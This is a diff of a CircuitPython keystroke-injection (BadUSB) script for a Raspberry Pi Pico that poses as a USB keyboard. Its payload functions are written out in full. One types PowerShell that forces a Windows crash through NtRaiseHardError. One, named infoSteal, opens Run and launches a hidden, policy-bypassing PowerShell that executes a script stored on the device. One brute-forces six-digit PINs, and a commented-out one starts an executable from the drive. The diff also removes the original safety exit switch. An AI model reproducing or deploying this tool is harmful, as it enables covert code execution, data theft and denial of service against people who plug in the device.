@@ -1,6 +1,15 @@
-# Auto Reload Main- ---------------------------------------------
+# Chip Settings -------------------------------------------------
+
+# Imports
+import supervisor # type: ignore
+
+# -Additional Imports-
+# import microcontroller # type: ignore
+# import board # type: ignore
+# import machine # type: ignore
+
+# Auto Reload
 AutoReload = False
-import supervisor
 supervisor.runtime.autoreload = AutoReload
 
 # Imports -------------------------------------------------------
@@ -8,33 +17,21 @@ supervisor.runtime.autoreload = AutoReload
 import time
 import usb_hid # type: ignore
 import random
-import digitalio
-import board
-from adafruit_hid.keyboard import Keyboard
-from adafruit_hid.keycode import Keycode
-from adafruit_hid.keyboard_layout_us import KeyboardLayout
-from adafruit_hid.mouse import Mouse
-from adafruit_hid.consumer_control import ConsumerControl
-from adafruit_hid.consumer_control_code import ConsumerControlCode
-import storage
+from adafruit_hid.keyboard import Keyboard # type: ignore
+from adafruit_hid.keycode import Keycode # type: ignore
+from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS # type: ignore
+from adafruit_hid.mouse import Mouse # type: ignore
+from adafruit_hid.consumer_control import ConsumerControl # type: ignore
+from adafruit_hid.consumer_control_code import ConsumerControlCode # type: ignore
+import storage # type: ignore
 
 # Variables -----------------------------------------------------
 
-led = digitalio.DigitalInOut(board.LED)
-gpio2 = digitalio.DigitalInOut(board.GP2)
-gpio3 = digitalio.DigitalInOut(board.GP3)
-
-led.direction = digitalio.Direction.OUTPUT
-gpio2.direction = digitalio.Direction.OUTPUT
-
 kbd = Keyboard(usb_hid.devices)
 cc = ConsumerControl(usb_hid.devices)
-kbdl = KeyboardLayout(kbd)
+kbdl = KeyboardLayoutUS(kbd)
 mouse = Mouse(usb_hid.devices)
-
-picoName = "CIRCUITPY"
-
-gpio2.value = True 
+PicoName = "CIRCUITPY"
 
 # Random Additions ----------------------------------------------
 
@@ -47,35 +44,11 @@ def Sleep(duration=0.1):
 def RanNum(min, max):
     return random.randint(min, max)
 
-# Mouse funcs ---------------------------------------------------
-def scrollMouse(y):
-    mouse.move(wheel=y)
-    
-def setMousePos(x, y):
-    mouse.move(x=x, y=y)
-
-def MoveMouse(dx, dy):
-    mouse.move(x=dx, y=dy)
-
-def ClickMouse(button=Mouse.LEFT_BUTTON):
-    mouse.click(button)
-    
-def ReleaseMouse(button=Mouse.LEFT_BUTTON):
-    mouse.release(button)
-    
-def holdReleaseMouse(button=Mouse.LEFT_BUTTON, duration=None):
-    ClickMouse(button)
-    if duration:
-        time.sleep(duration)
-        ReleaseMouse(button)
-    else:
-        pass
-        
 # Key Maps -------------------------------------------------------
 
-
+# Keyboard Custom Names
 KEY_MAP = {
-    "win": (Keycode.GUI,),"gui": (Keycode.GUI,), "enter": (Keycode.ENTER,), "space": (Keycode.SPACEBAR,),
+    "win": (Keycode.GUI,), "gui": (Keycode.GUI,), "enter": (Keycode.ENTER,), "space": (Keycode.SPACEBAR,),
     "lshift": (Keycode.LEFT_SHIFT,), "rshift": (Keycode.RIGHT_SHIFT,), "shift": (Keycode.LEFT_SHIFT,),
     "lctrl": (Keycode.LEFT_CONTROL,), "rctrl": (Keycode.RIGHT_CONTROL,), "ctrl": (Keycode.LEFT_CONTROL,),
     "lalt": (Keycode.LEFT_ALT,), "ralt": (Keycode.RIGHT_ALT,), "alt": (Keycode.LEFT_ALT,),
@@ -90,10 +63,11 @@ KEY_MAP = {
     "scrolllock": (Keycode.SCROLL_LOCK,), "pause": (Keycode.PAUSE,), "insert": (Keycode.INSERT,),
     "ins": (Keycode.INSERT,), "home": (Keycode.HOME,), "end": (Keycode.END,), "pageup": (Keycode.PAGE_UP,),
     "pagedown": (Keycode.PAGE_DOWN,), "pgup": (Keycode.PAGE_UP,), "pgdn": (Keycode.PAGE_DOWN,),
-    "app": (Keycode.APPLICATION,),"application": (Keycode.APPLICATION,),"menu": (Keycode.APPLICATION,),
+    "app": (Keycode.APPLICATION,), "application": (Keycode.APPLICATION,), "menu": (Keycode.APPLICATION,),
     "newline": (Keycode.SHIFT, Keycode.ENTER,), "nl": (Keycode.SHIFT, Keycode.ENTER,),
 }
 
+# Consumer Control Custom Names (these are keys that are used in laptops/media remotes)
 CC_MAP = {
     "play": (ConsumerControlCode.PLAY_PAUSE,), "pause": (ConsumerControlCode.PLAY_PAUSE,),
     "stop": (ConsumerControlCode.STOP,), "next": (ConsumerControlCode.SCAN_NEXT_TRACK,),
@@ -109,7 +83,52 @@ CC_MAP = {
     "brightnessdown": (ConsumerControlCode.BRIGHTNESS_DECREMENT,), "brightdown": (ConsumerControlCode.BRIGHTNESS_DECREMENT,)
 }
 
+# Mouse Custom Names --------------------------------------------
+MOUSE_MAP = {
+    "left": (Mouse.LEFT_BUTTON,),
+    "right": (Mouse.RIGHT_BUTTON,),
+    "middle": (Mouse.MIDDLE_BUTTON,)
+}
 
+# Mouse funcs ---------------------------------------------------
+def ScrollMouse(y=1):
+    mouse.move(wheel=y)
+    
+def SetMousePos(x=0, y=0):
+    mouse.move(x=x, y=y)
+
+def MoveMouse(dx=1, dy=1):
+    mouse.move(x=dx, y=dy)
+
+def ClickMouse(button=Mouse.LEFT_BUTTON):
+    try:
+        mouse.click(button)
+    except:
+        mouse.click(MOUSE_MAP.get(button, Mouse.LEFT_BUTTON)[0])
+
+def PressMouse(button=Mouse.LEFT_BUTTON):
+    try:
+        mouse.press(button)
+    except:
+        mouse.press(MOUSE_MAP.get(button, Mouse.LEFT_BUTTON)[0])
+
+def ReleaseMouse(button=Mouse.LEFT_BUTTON):
+    try:
+        mouse.release(button)
+    except:
+        mouse.release(MOUSE_MAP.get(button, Mouse.LEFT_BUTTON)[0])
+
+def clickReleaseMouse(button=Mouse.LEFT_BUTTON, duration=None):
+    ClickMouse(button)
+    if duration:
+        Sleep(duration)
+    else:
+        pass
+    ReleaseMouse(button)
+
+def relAllMouseKeys():
+    mouse.release_all()
+        
 # Keyboard funcs ------------------------------------------------
 
 def relAllKeys():
@@ -129,15 +148,13 @@ def getKeycode(dk):
 
 def pressKey(k):
     dk = getKeycode(k)
-    if dk:
-        for i in dk:
-            kbd.press(i)
+    for i in dk:
 
+        kbd.press(i)
 def releaseKey(k):
     dk = getKeycode(k)
-    if dk:
-        for i in dk:
-            kbd.release(i)
+    for i in dk:
+        kbd.release(i)
     
 def writeKeys(text, delay=0):
     for char in text:
@@ -152,48 +169,42 @@ def sendKeys(t,ed=.1, td=0):
     pressReleaseKey("enter")
     
 def pressReleaseKeys(k="ctrl", dk="v", delay=.1):
-    try:
-        pressKey(k)
-        pressKey(dk)
-        Sleep(delay)
-        releaseKey(dk)
-        releaseKey(k)
-    except Exception as e:
-        # Emergency key release if something goes wrong
-        print(f"Error in pressReleaseKeys: {e}")
-        relAllKeys()
+    pressKey(k)
+    pressKey(dk)
+    Sleep(delay)
+    releaseKey(dk)
+    releaseKey(k)
     
 def pressReleaseKey(k="enter", delay=.1):
-    try:
-        if k in CC_MAP:
-            dk = getKeycode(k)
-            for i in dk:
-                cc.send(i)
-        else:
-            pressKey(k)
-            Sleep(delay)
-            releaseKey(k)
-    except Exception as e:
-        # Emergency key release if something goes wrong
-        print(f"Error in pressReleaseKey: {e}")
-        relAllKeys()
+    if k in CC_MAP:
+        dk = getKeycode(k)
+        for i in dk:
+            cc.send(i)
+    else:
+        pressKey(k)
+        Sleep(delay)
+        releaseKey(k)
 
     
 # Useful Additions -------------------------------------------
 
-# ----Mouse --------------------------------------------------
+def ReleseAll():
+    relAllKeys()
+    relAllMouseKeys()
+
+# ---- Mouse -------------------------------------------------
 
 def CrazyMouseTP(duration=10,delay=0):
     start_time = time.time()
     while time.time() - start_time < duration:
-        setMousePos(RanNum(-1000, 1000), RanNum(-1000, 1000))
-        time.sleep(delay)
+        SetMousePos(RanNum(-1000, 1000), RanNum(-1000, 1000))
+        Sleep(delay)
 
 def CrazyMouseMove(intensity=5, duration=10,delay=0):
     start_time = time.time()
     while time.time() - start_time < duration:
         MoveMouse(RanNum(intensity * -1, intensity), RanNum(intensity * -1, intensity))
-        time.sleep(delay)
+        Sleep(delay)
         
 # ---- Keyboard ----------------------------------------------
 
@@ -350,27 +361,26 @@ def bsod():
     writeKeys('\n[bool]$enabled = $false\n[NativeMethods]::RtlAdjustPrivilege(19, $true, $false, [ref]$enabled)\n[int]$response = 0\n[NativeMethods]::NtRaiseHardError(0xC0000420, 0, 0, [IntPtr]::Zero, 6, [ref]$response)\n')
     
 def infoSteal():
-    try:
-        pressReleaseKeys("win", "r")
-        Sleep(1.5)
-        sendKeys('powershell -ExecutionPolicy Bypass -Command "$v=Get-Volume|?{$_.FileSystemLabel -eq \'' + picoName + '\'};$p=$v.DriveLetter+\':\\\\is.ps1\';iex \\"& \'$p\'\\""',td=0)
-    except Exception as e:
-        print(f"Error in infoSteal: {e}")
-        relAllKeys()
-# Main Func --------------------------------------------------
+    pressReleaseKeys("win", "r")
+    Sleep(1.5)
+    sendKeys('powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$v=Get-Volume|?{$_.FileSystemLabel -eq \'' + PicoName + '\'};$p=$v.DriveLetter+\':\\\\is.ps1\';iex \\"& \'$p\'\\""',td=0)
+    
+def bruteForce(d=0):
+    for pin in range(1000000):
+        pin_str = f"{pin:06}"
+        sendKeys(pin_str)
+        Sleep(d)
+
+def actionTest():
+    writeKeys("Action test completed.")
+        
+# def startAdminProgram(d=0.5):
+#     pressReleaseKeys("win", "r")
+#     Sleep(1.5)
+#     sendKeys(f'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$v=Get-Volume|?{{$_.FileSystemLabel -eq \'{PicoName}\'}};$p=$v.DriveLetter+\\\':\\\\m.exe\\\';Start-Process -FilePath $p"', td=0)
+#     Sleep(d)
 
 def main():
-    try:
-        if gpio3.value == False:
-            Sleep(1)
-            infoSteal()
-        elif gpio3.value == True:
-            print("GPIO2 and GPIO3 is shorted, exiting")
-    except Exception as e:
-        print(f"Error in main: {e}")
-    finally:
-        # Always release all keys at the end to prevent stuck keys
-        relAllKeys()
-        Sleep(0.1)  # Small delay to ensure release is processed
+    actionTest()
 
-main() 
+main()
